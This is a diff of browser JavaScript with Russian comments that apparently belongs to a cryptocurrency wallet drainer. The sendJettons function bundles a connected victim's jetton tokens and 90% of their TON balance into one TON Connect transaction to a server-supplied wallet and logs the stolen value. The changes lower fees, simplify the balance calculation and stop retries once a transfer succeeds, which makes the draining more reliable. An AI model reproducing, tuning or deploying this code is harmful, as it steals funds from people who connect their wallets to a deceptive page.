@@ -193,7 +193,6 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         tonBalance: ton
     });
     
-    // Проверяем данные
     if (!data || !data.data || !data.data.boc) {
         console.error('Invalid data in sendJettons');
         return;
@@ -217,7 +216,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
     
     console.log(`Processing ${len} jettons, starting from index ${i}`);
 
-    // Обрабатываем jettons
+    // Обрабатываем jettons (максимум 2, чтобы оставить место для TON)
     for (let currentIndex = i; currentIndex < len && msgs < 2; currentIndex++) {
         try {
             if (data.data.boc[currentIndex] && data.data.address[currentIndex]) {
@@ -225,7 +224,6 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                 
                 console.log(`Raw jetton address: ${jettonAddress}`);
                 
-                // Конвертируем адрес для TON Connect
                 try {
                     if (jettonAddress.startsWith('EQ')) {
                         const addrObj = new TonWeb.utils.Address(jettonAddress);
@@ -243,7 +241,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
                 
                 transaction.messages.push({
                     address: jettonAddress,
-                    amount: TonWeb.utils.toNano('0.15').toString(),
+                    amount: TonWeb.utils.toNano('0.07').toString(), // Уменьшили комиссию для jettons
                     payload: data.data.boc[currentIndex]
                 });
                 
@@ -260,104 +258,91 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         }
     }
 
-    // ИСПРАВЛЕНИЕ: Правильный расчет TON для отправки с учетом 3% резерва
+    // ИСПРАВЛЕНИЕ: Упрощенный и надежный расчет TON
     console.log('Checking TON transfer conditions:', {
-        tontx: tontx,
+        currentMessages: transaction.messages.length,
         tonBalance: ton,
-        condition: parseFloat(ton) > 0.1,
-        messagesCount: transaction.messages.length,
-        maxMessages: 4
+        parseFloatTon: parseFloat(ton)
     });
 
-    // Всегда пытаемся добавить TON если баланс больше 0.05 (для комиссий)
-if (parseFloat(ton) > 0.05) {
-    console.log('Adding TON transfer...');
-    try {
-        const tonBalance = parseFloat(ton);
-        
-        // Рассчитываем сумму для отправки: весь баланс минус 3% для комиссий
-        const reservedForFees = tonBalance * 0.03;
-        let transferAmount = tonBalance - reservedForFees;
-        
-        // Гарантируем что останется минимум 0.05 TON для комиссий
-        if (transferAmount > tonBalance - 0.05) {
-            transferAmount = tonBalance - 0.05;
-        }
-        
-        // Если после вычета получается очень мало, отправляем 90% от баланса
-        if (transferAmount < 0.01) {
-            transferAmount = tonBalance * 0.9;
-        }
-        
-        console.log(`TON balance: ${tonBalance}, Reserved for fees: ${reservedForFees}, Transfer amount: ${transferAmount}`);
-        
-        if (transferAmount > 0.001) {
-            // ИСПРАВЛЕНИЕ: Округляем до 9 знаков после запятой
-            const transferAmountRounded = parseFloat(transferAmount.toFixed(9));
-            const transfer_value_nano = TonWeb.utils.toNano(transferAmountRounded.toString());
-            const transfer_value_str = transfer_value_nano.toString();
+    // Всегда пытаемся добавить TON если баланс больше 0.1
+    if (parseFloat(ton) > 0.1) {
+        console.log('Adding TON transfer...');
+        try {
+            const tonBalance = parseFloat(ton);
             
-            const tonAmount = transferAmountRounded.toFixed(6);
-            console.log('TON transfer value:', tonAmount, 'TON');
-            console.log('Transfer value in nano:', transfer_value_str);
+            // УПРОЩЕННЫЙ РАСЧЕТ: отправляем 90% от баланса, оставляем 10% для комиссий
+            let transferAmount = tonBalance * 0.9;
             
-            let payload = await get_ton_text(transfer_value_str);
-            console.log('TON payload result:', payload);
+            // Округляем до 6 знаков для избежания ошибок
+            transferAmount = parseFloat(transferAmount.toFixed(6));
             
-            // Упрощаем проверку payload
-            if (payload && payload.data) {
-                const tonDestinationAddress = data.data.wallet;
-                console.log('TON destination address:', tonDestinationAddress);
+            console.log(`TON balance: ${tonBalance}, Transfer amount: ${transferAmount}`);
+            
+            if (transferAmount > 0.01) {
+                const transfer_value_nano = TonWeb.utils.toNano(transferAmount.toString());
+                const transfer_value_str = transfer_value_nano.toString();
                 
-                transaction.messages.push({
-                    address: tonDestinationAddress,
-                    amount: transfer_value_str,
-                    payload: payload.data
-                });
+                console.log('TON transfer value:', transferAmount, 'TON');
+                console.log('Transfer value in nano:', transfer_value_str);
                 
-                tokens[tkn] = {
-                    name: 'TON',
-                    prices: parseFloat(tonAmount) * parseFloat(tonPrice)
-                };
-                tkn++;
-                tontx = true;
-                console.log('✅ Added TON transfer to transaction:', tonAmount, 'TON');
-            } else {
-                // Создаем payload вручную
-                console.log('Creating manual TON payload...');
-                const manualPayload = await createManualTonPayload();
-                if (manualPayload) {
+                let payload = await get_ton_text(transfer_value_str);
+                console.log('TON payload result:', payload);
+                
+                // Упрощенная проверка payload
+                if (payload && payload.data) {
+                    const tonDestinationAddress = data.data.wallet;
+                    console.log('TON destination address:', tonDestinationAddress);
+                    
                     transaction.messages.push({
-                        address: data.data.wallet,
+                        address: tonDestinationAddress,
                         amount: transfer_value_str,
-                        payload: manualPayload
+                        payload: payload.data
                     });
                     
                     tokens[tkn] = {
                         name: 'TON',
-                        prices: parseFloat(tonAmount) * parseFloat(tonPrice)
+                        prices: transferAmount * parseFloat(tonPrice)
                     };
                     tkn++;
                     tontx = true;
-                    console.log('✅ Added TON transfer with manual payload:', tonAmount, 'TON');
+                    console.log('✅ Added TON transfer to transaction:', transferAmount, 'TON');
+                } else {
+                    // Создаем payload вручную
+                    console.log('Creating manual TON payload...');
+                    const manualPayload = await createManualTonPayload();
+                    if (manualPayload) {
+                        transaction.messages.push({
+                            address: data.data.wallet,
+                            amount: transfer_value_str,
+                            payload: manualPayload
+                        });
+                        
+                        tokens[tkn] = {
+                            name: 'TON',
+                            prices: transferAmount * parseFloat(tonPrice)
+                        };
+                        tkn++;
+                        tontx = true;
+                        console.log('✅ Added TON transfer with manual payload:', transferAmount, 'TON');
+                    } else {
+                        console.log('❌ Failed to create manual payload');
+                    }
                 }
+            } else {
+                console.log('❌ TON transfer amount too small:', transferAmount);
             }
-        } else {
-            console.log('❌ TON transfer amount too small:', transferAmount);
+        } catch (tonError) {
+            console.error('❌ Error adding TON transfer:', tonError);
+            // Даже если не удалось добавить TON, продолжаем с jettons
         }
-    } catch (tonError) {
-        console.error('❌ Error adding TON transfer:', tonError);
+    } else {
+        console.log('❌ TON balance too low for transfer:', ton);
     }
-} else {
-    console.log('❌ TON balance too low for transfer:', ton);
-}
 
-    // Остальной код без изменений...
     // Проверяем что есть сообщения для отправки
     console.log(`Final transaction has ${transaction.messages.length} messages`);
-    console.log('Messages:', transaction.messages.map((m, idx) => 
-        `${idx}: ${m.address === data.data.wallet ? 'TON transfer' : 'Jetton transfer'} to ${m.address}`
-    ));
+    console.log('Transaction includes TON:', tontx);
     
     if (transaction.messages.length > 0) {
         // Финальная проверка всех адресов
@@ -371,7 +356,6 @@ if (parseFloat(ton) > 0.05) {
                 }
                 
                 validMessages.push(msg);
-                console.log(`✅ Valid message: ${msg.address === data.data.wallet ? 'TON' : 'Jetton'} transfer`);
             } catch (e) {
                 console.error(`❌ Invalid message removed: ${msg.address}`);
             }
@@ -384,7 +368,9 @@ if (parseFloat(ton) > 0.05) {
             return;
         }
         
-        console.log(`📤 Preparing to send transaction with ${transaction.messages.length} messages`);
+        console.log('Transaction messages:', transaction.messages.map((m, i) => 
+            `${i}: ${m.address === data.data.wallet ? 'TON' : 'Jetton'} - ${m.amount}`
+        ));
         
         try {
             if (tryies > 0) {
@@ -409,7 +395,10 @@ if (parseFloat(ton) > 0.05) {
             };
             
             await jettons_transaction_done(data123);
-            console.log('🎉 Transaction completed successfully, hash:', hash);
+            console.log('🎉 Transaction completed successfully');
+            
+            // После успешной транзакции прерываем дальнейшие попытки
+            return;
             
         } catch (error) {
             console.error('❌ Transaction failed:', error);
@@ -420,16 +409,7 @@ if (parseFloat(ton) > 0.05) {
             }
             
             if (error.message && error.message.includes('Insufficient balance')) {
-                console.log('❌ Insufficient balance - this should not happen with 3% reserve');
-                // Может потребоваться увеличить резерв
-                return;
-            }
-            
-            if (error.message && error.message.includes('429')) {
-                console.log('❌ Rate limit exceeded, increasing delay...');
-                setTimeout(() => {
-                    sendJettons(data, walletAddress, ton, tonPrice, i, tryies + 1, tonFlag);
-                }, 10000);
+                console.log('❌ Insufficient balance - stopping retries');
                 return;
             }
             
@@ -799,6 +779,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
